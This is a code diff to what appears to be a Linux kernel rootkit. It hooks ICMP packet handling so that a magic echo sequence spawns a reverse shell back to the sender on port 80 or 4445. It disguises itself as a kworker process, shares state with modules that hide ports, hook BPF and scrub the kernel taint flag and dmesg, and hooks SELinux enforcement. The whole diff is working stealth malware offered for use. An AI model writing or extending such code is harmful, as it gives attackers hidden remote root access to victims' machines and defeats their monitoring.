@@ -3,11 +3,25 @@
 #include "../include/hidden_pids.h"
 #include "../ftrace/ftrace_helper.h"
 
-#define SRV_PORT "80"
+/* Per-slot hardcoded ports (must match hiding_tcp.c PORT / PORT2) */
+#define SRV_PORT  "80"
 #define SRV_PORT2 "4445"
-#define ICMP_MAGIC_SEQ 1337
-#define ICMP_MAGIC_SEQ2 1338
+
+/* Magic ICMP echo sequences that identify which slot to fill */
+#define ICMP_MAGIC_SEQ  1337   /* slot 0 */
+#define ICMP_MAGIC_SEQ2 1338   /* slot 1 */
+
 #define PROC_NAME "[kworker/0:1]"
+
+/* Exported: registered IPs for each instance, filled on first ICMP trigger.
+ * All stealth modules (hiding_tcp, bpf_hook, clear_taint_dmesg) read this. */
+__be32 g_srv_ips[MAX_INSTANCES] = {0};
+EXPORT_SYMBOL(g_srv_ips);
+
+/* Protects g_srv_ips[].  Written from ICMP softirq, read from hook functions.
+ * Use spin_lock_irqsave / spin_unlock_irqrestore in all paths. */
+DEFINE_SPINLOCK(g_srv_ips_lock);
+EXPORT_SYMBOL(g_srv_ips_lock);
 
 static asmlinkage int (*orig_icmp_rcv)(struct sk_buff *);
 static asmlinkage ssize_t (*orig_sel_read_enforce)(struct file *, char __user *, size_t, loff_t *);
@@ -15,8 +29,8 @@ static asmlinkage ssize_t (*orig_sel_write_enforce)(struct file *, const char __
 
 struct revshell_work {
     struct work_struct work;
-    const char *ip;
-    const char *port;
+    char ip[INET_ADDRSTRLEN]; /* dotted-decimal string, filled from packet src */
+    const char *port;         /* points to SRV_PORT or SRV_PORT2 */
 };
 
 static void *selinux_state_ptr = NULL;
@@ -136,12 +150,18 @@ notrace static void spawn_revshell(struct work_struct *work)
     kfree(rw);
 }
 
+/* Per-slot port table (index must match g_srv_ips slot) */
+static const char * const slot_ports[MAX_INSTANCES] = { SRV_PORT, SRV_PORT2 };
+static const u16 slot_seqs[MAX_INSTANCES] = { ICMP_MAGIC_SEQ, ICMP_MAGIC_SEQ2 };
+
 notrace static asmlinkage int hook_icmp_rcv(struct sk_buff *skb)
 {
     struct iphdr *iph;
     struct icmphdr *icmph;
-    u32 trigger_ip, trigger_ip2;
     struct revshell_work *rw;
+    unsigned long flags;
+    u16 seq;
+    int slot;
 
     if (!skb)
         goto out;
@@ -151,35 +171,30 @@ notrace static asmlinkage int hook_icmp_rcv(struct sk_buff *skb)
         goto out;
 
     icmph = icmp_hdr(skb);
-    if (!icmph)
+    if (!icmph || icmph->type != ICMP_ECHO)
         goto out;
 
-    if (in4_pton(YOUR_SRV_IP, -1, (u8 *)&trigger_ip, -1, NULL) &&
-        iph->saddr == trigger_ip &&
-        icmph->type == ICMP_ECHO &&
-        ntohs(icmph->un.echo.sequence) == ICMP_MAGIC_SEQ) {
+    seq = ntohs(icmph->un.echo.sequence);
+
+    for (slot = 0; slot < MAX_INSTANCES; slot++) {
+        if (seq != slot_seqs[slot])
+            continue;
+
+        /* Register/update the IP for this slot from the packet source.
+         * Active shells connect back on the port (which is still hidden),
+         * so an IP change only affects newly spawned shells. */
+        spin_lock_irqsave(&g_srv_ips_lock, flags);
+        g_srv_ips[slot] = iph->saddr;
+        spin_unlock_irqrestore(&g_srv_ips_lock, flags);
 
         rw = kmalloc(sizeof(*rw), GFP_ATOMIC);
         if (rw) {
-            rw->ip = YOUR_SRV_IP;
-            rw->port = SRV_PORT;
+            snprintf(rw->ip, sizeof(rw->ip), "%pI4", &iph->saddr);
+            rw->port = slot_ports[slot];
             INIT_WORK(&rw->work, spawn_revshell);
             schedule_work(&rw->work);
         }
-    }
-
-    if (in4_pton(YOUR_SRV_IP2, -1, (u8 *)&trigger_ip2, -1, NULL) &&
-        iph->saddr == trigger_ip2 &&
-        icmph->type == ICMP_ECHO &&
-        ntohs(icmph->un.echo.sequence) == ICMP_MAGIC_SEQ2) {
-
-        rw = kmalloc(sizeof(*rw), GFP_ATOMIC);
-        if (rw) {
-            rw->ip = YOUR_SRV_IP2;
-            rw->port = SRV_PORT2;
-            INIT_WORK(&rw->work, spawn_revshell);
-            schedule_work(&rw->work);
-        }
+        break;
     }
 
 out:
